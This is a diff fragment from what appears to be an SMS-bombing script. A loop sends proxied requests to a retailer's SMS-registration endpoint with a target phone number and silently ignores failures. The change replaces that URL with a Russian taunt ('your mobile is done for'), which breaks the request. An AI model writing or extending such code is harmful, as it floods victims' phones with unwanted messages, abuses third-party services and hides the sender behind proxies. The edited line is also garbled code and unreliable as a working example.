@@ -200,7 +200,7 @@ def MAIN():
 					except:
 						pass
 					try:
-						requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
+						requests.get("Хана твоей мобиле!", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
 					except:
 						pass
 					try:
